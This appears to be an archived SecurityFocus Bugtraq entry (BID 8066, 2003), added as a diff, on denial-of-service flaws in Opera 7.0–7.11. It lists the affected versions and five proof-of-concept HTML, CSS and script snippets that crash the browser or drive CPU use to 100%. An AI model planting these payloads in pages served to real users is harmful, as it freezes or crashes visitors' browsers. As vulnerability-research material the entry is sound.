@@ -1,0 +1,104 @@
+#SpeeDr00t@Black Falcon<br>#bid8066<p><b><span style="font-size: 18pt;">Multiple Opera Denial Of Service Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/8066/info">info</a><br><a href="http://www.securityfocus.com/bid/8066/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/8066/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/8066/solution">solution</a><br><a href="http://www.securityfocus.com/bid/8066/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				8066
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Jun 30 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jun 30 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of these issues is credited to :: Operash ::.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Opera Software Opera Web Browser 7.11 b<br/>
+					
+				
+					Opera Software Opera Web Browser 7.11 <br/>
+					
+				
+					Opera Software Opera Web Browser 7.10 <br/>
+					
+				
+					Opera Software Opera Web Browser 7.0 3win32<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	:: Operash :: has provided the following examples:<br/><br/> CODE 1 <br/><br/>Just 12 bytes data "&lt;!DOCTYPE" + NULL(\x00) + 1byte + "&gt;" makes<br/>CPU usage go up to 100%(depending on comp specs) and the computer<br/>gets freeze down.<br/><br/>-----------------------------------------------------------------<br/>&lt;!DOCTYPE\x00A&gt;<br/>-----------------------------------------------------------------<br/><br/> CODE 2 <br/><br/>Abnormal termination is caused.<br/><br/>-----------------------------------------------------------------<br/>&lt;form&gt;&lt;/form&gt;&lt;script&gt;document.forms0.submit()&lt;/script&gt;<br/>-----------------------------------------------------------------<br/><br/> CODE 3 <br/><br/>Abnormal termination is caused.<br/><br/>-----------------------------------------------------------------<br/>&lt;table&gt;<br/>&lt;tr id="crash" style="display:inline"&gt;&lt;td&gt;<br/>&lt;script&gt;crash.style.display = "none";&lt;/script&gt;<br/>&lt;/td&gt;&lt;/tr&gt;<br/>&lt;/table&gt;<br/>-----------------------------------------------------------------<br/><br/> CODE 4 <br/><br/>Abnormal termination is caused.<br/><br/>-----------------------------------------------------------------<br/>&lt;table&gt;<br/>&lt;map id="crash" style="position:absolute"&gt;&lt;/map&gt;<br/>&lt;script&gt;crash.style.height = crash.style.width = '0';&lt;/script&gt;<br/>&lt;/table&gt;<br/>-----------------------------------------------------------------<br/><br/> CODE 5 <br/><br/>CPU usage go up to 100%(depending on comp specs) and the computer gets freeze down.<br/><br/>-----------------------------------------------------------------<br/>&lt;html&gt;<br/>&lt;head&gt;<br/>&lt;style type="text/css"&gt;<br/>&lt;!--<br/>.aaaaa:after{content:"A";display:block}<br/>.bbbbb{display:run-in}<br/>.ccccc{display:inline-block}<br/>//--&gt;<br/>&lt;/style&gt;<br/>&lt;/head&gt;<br/>&lt;body&gt;<br/>&lt;div class="aaaaa"&gt;<br/>&lt;div class="bbbbb"&gt;<br/>&lt;div class="ccccc"&gt;<br/>&lt;/div&gt;<br/>&lt;/div&gt;<br/>&lt;/div&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;<br/>-----------------------------------------------------------------
+	
+		<ul>
+</ul>
+</div>
